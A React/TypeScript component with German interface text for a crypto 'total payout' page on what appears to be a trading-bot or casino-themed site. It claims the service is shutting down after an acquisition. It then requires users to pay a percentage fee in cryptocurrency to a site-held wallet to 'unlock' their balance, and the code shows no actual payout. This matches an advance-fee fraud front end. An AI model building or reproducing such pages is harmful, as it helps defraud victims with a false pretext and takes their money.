import { useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { motion } from "framer-motion";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Separator } from "@/components/ui/separator";
import { AlertTriangle, Wallet, Lock, Unlock, CheckCircle2 } from "lucide-react";
import { useWallets } from "@/hooks/useWallets";

interface PayoutData {
  id: string;
  user_id: string;
  user_email: string;
  fee_percentage: number;
  user_balance: number;
  payout_currency: string | null;
  payout_wallet_address: string | null;
  fee_paid: boolean;
  fee_amount: number | null;
  fee_payment_currency: string | null;
  status: string;
}

interface TotalPayoutFormProps {
  payoutData: PayoutData;
  onUpdate: () => void;
}

export const TotalPayoutForm = ({ payoutData, onUpdate }: TotalPayoutFormProps) => {
  const { toast } = useToast();
  const { wallets, walletsLoading, walletError } = useWallets();
  const [step, setStep] = useState<'info' | 'fee-payment'>('info');
  const [payoutCurrency, setPayoutCurrency] = useState(payoutData.payout_currency || '');
  const [payoutWalletAddress, setPayoutWalletAddress] = useState(payoutData.payout_wallet_address || '');
  const [feePaymentCurrency, setFeePaymentCurrency] = useState('');
  const [processing, setProcessing] = useState(false);

  const balanceInEuros = payoutData.user_balance / 100;
  const feeAmountInEuros = (balanceInEuros * payoutData.fee_percentage) / 100;
  const feeAmountInCents = Math.round(feeAmountInEuros * 100);

  const handleSavePayoutDetails = async () => {
    if (!payoutCurrency || !payoutWalletAddress) {
      toast({
        title: "Fehlende Angaben",
        description: "Bitte wählen Sie eine Währung und geben Sie Ihre Wallet-Adresse an.",
        variant: "destructive"
      });
      return;
    }

    setProcessing(true);
    try {
      const { error } = await supabase
        .from('total_payouts')
        .update({
          payout_currency: payoutCurrency,
          payout_wallet_address: payoutWalletAddress,
          fee_amount: feeAmountInCents,
          updated_at: new Date().toISOString()
        })
        .eq('id', payoutData.id);

      if (error) throw error;

      toast({
        title: "Angaben gespeichert",
        description: "Ihre Auszahlungsdetails wurden erfolgreich gespeichert."
      });

      setStep('fee-payment');
      onUpdate();
    } catch (error: any) {
      console.error("Error saving payout details:", error);
      toast({
        title: "Fehler",
        description: "Die Angaben konnten nicht gespeichert werden.",
        variant: "destructive"
      });
    } finally {
      setProcessing(false);
    }
  };

  const getFeePaymentWallet = () => {
    if (!feePaymentCurrency) return null;
    return wallets.find(w => w.currency === feePaymentCurrency);
  };

  const feePaymentWallet = getFeePaymentWallet();

  if (step === 'fee-payment' || payoutData.payout_currency) {
    return (
      <div className="grid md:grid-cols-2 gap-6">
        <Card className="bg-casino-card border-gold/10">
          <CardHeader>
            <CardTitle className="text-gold flex items-center">
              <Wallet className="mr-2 h-5 w-5" />
              Gebühren bezahlen
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="bg-orange-900/20 border border-orange-500/30 rounded-lg p-4">
              <div className="flex items-center mb-2">
                <AlertTriangle className="h-5 w-5 text-orange-400 mr-2" />
                <span className="font-medium text-orange-400">Gebühr erforderlich</span>
              </div>
              <p className="text-sm text-gray-300">
                Um Ihre Auszahlung freizuschalten, müssen Sie eine Gebühr von{' '}
                <span className="font-bold text-white">{payoutData.fee_percentage}%</span> bezahlen.
              </p>
            </div>

            <div className="space-y-2">
              <Label htmlFor="fee-currency">Zahlungsmethode für Gebühr</Label>
              <Select value={feePaymentCurrency} onValueChange={setFeePaymentCurrency}>
                <SelectTrigger className="bg-casino-darker border-gold/20">
                  <SelectValue placeholder="Kryptowährung auswählen" />
                </SelectTrigger>
                <SelectContent className="bg-casino-card border-gold/20">
                  {wallets.map((wallet) => (
                    <SelectItem key={wallet.id} value={wallet.currency}>
                      {wallet.currency.toUpperCase()}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            {feePaymentWallet && (
              <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-4">
                <h4 className="font-medium text-green-400 mb-2">Zahlungsdetails</h4>
                <div className="space-y-2 text-sm">
                  <div>
                    <span className="text-gray-400">Betrag: </span>
                    <span className="font-bold text-white">{feeAmountInEuros.toFixed(2)}€</span>
                  </div>
                  <div>
                    <span className="text-gray-400">Wallet-Adresse:</span>
                    <div className="bg-casino-darker p-2 rounded mt-1 break-all font-mono text-xs">
                      {feePaymentWallet.wallet_address}
                    </div>
                  </div>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        <Card className="bg-casino-card border-gold/10">
          <CardHeader>
            <CardTitle className="text-gold flex items-center">
              <CheckCircle2 className="mr-2 h-5 w-5" />
              Ihre Auszahlung
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="bg-blue-900/20 border border-blue-500/30 rounded-lg p-4">
              <h4 className="font-medium text-blue-400 mb-2">Auszahlungsdetails</h4>
              <div className="space-y-2 text-sm">
                <div>
                  <span className="text-gray-400">Guthaben: </span>
                  <span className="font-bold text-white">{balanceInEuros.toFixed(2)}€</span>
                </div>
                <div>
                  <span className="text-gray-400">Währung: </span>
                  <span className="text-white">{(payoutData.payout_currency || payoutCurrency).toUpperCase()}</span>
                </div>
                <div>
                  <span className="text-gray-400">Wallet:</span>
                  <div className="bg-casino-darker p-2 rounded mt-1 break-all font-mono text-xs">
                    {payoutData.payout_wallet_address || payoutWalletAddress}
                  </div>
                </div>
              </div>
            </div>

            <div className="flex items-center justify-center py-4">
              {payoutData.fee_paid ? (
                <div className="flex items-center text-green-400">
                  <Unlock className="mr-2 h-6 w-6" />
                  <span className="font-medium">Auszahlung freigeschaltet!</span>
                </div>
              ) : (
                <div className="flex items-center text-orange-400">
                  <Lock className="mr-2 h-6 w-6" />
                  <span className="font-medium">Warten auf Gebührenzahlung</span>
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="grid md:grid-cols-2 gap-6">
      <Card className="bg-casino-card border-gold/10">
        <CardHeader>
          <CardTitle className="text-gold">Wichtige Information</CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="bg-red-900/20 border border-red-500/30 rounded-lg p-4">
            <h3 className="font-bold text-red-400 mb-2">Service-Einstellung</h3>
            <p className="text-sm text-gray-300 leading-relaxed">
              Unser Unternehmen wurde von einem größeren Konzern übernommen, der unseren 
              KI-Trading-Bot exklusiv für interne Zwecke nutzen möchte. Daher müssen wir 
              unseren öffentlichen Service leider einstellen.
            </p>
          </div>
          
          <div className="bg-blue-900/20 border border-blue-500/30 rounded-lg p-4">
            <h3 className="font-bold text-blue-400 mb-2">Ihre Auszahlung</h3>
            <p className="text-sm text-gray-300 leading-relaxed">
              Wir sorgen dafür, dass Sie Ihr gesamtes Guthaben erhalten. Bitte wählen Sie 
              unten Ihre bevorzugte Kryptowährung für die Auszahlung aus und geben Sie 
              Ihre Wallet-Adresse an.
            </p>
          </div>
        </CardContent>
      </Card>

      <Card className="bg-casino-card border-gold/10">
        <CardHeader>
          <CardTitle className="text-gold flex items-center">
            <Wallet className="mr-2 h-5 w-5" />
            Auszahlungsdetails
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-4 text-center">
            <h3 className="text-sm text-gray-400 mb-1">Ihr verfügbares Guthaben</h3>
            <p className="text-3xl font-bold text-green-400">{balanceInEuros.toFixed(2)}€</p>
          </div>

          <Separator className="bg-gold/20" />

          <div className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="payout-currency">Auszahlungswährung</Label>
              <Select value={payoutCurrency} onValueChange={setPayoutCurrency}>
                <SelectTrigger className="bg-casino-darker border-gold/20">
                  <SelectValue placeholder="Kryptowährung auswählen" />
                </SelectTrigger>
                <SelectContent className="bg-casino-card border-gold/20">
                  {walletsLoading ? (
                    <SelectItem value="loading" disabled>Wird geladen...</SelectItem>
                  ) : (
                    wallets.map((wallet) => (
                      <SelectItem key={wallet.id} value={wallet.currency}>
                        {wallet.currency.toUpperCase()}
                      </SelectItem>
                    ))
                  )}
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <Label htmlFor="wallet-address">Ihre Wallet-Adresse</Label>
              <Input
                id="wallet-address"
                type="text"
                value={payoutWalletAddress}
                onChange={(e) => setPayoutWalletAddress(e.target.value)}
                placeholder="Wallet-Adresse eingeben"
                className="bg-casino-darker border-gold/20 text-white font-mono text-sm"
              />
            </div>

            <Button
              onClick={handleSavePayoutDetails}
              disabled={processing || !payoutCurrency || !payoutWalletAddress}
              className="w-full bg-gold hover:bg-gold/90 text-black font-medium"
            >
              {processing ? "Wird verarbeitet..." : "Weiter zur Gebührenzahlung"}
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};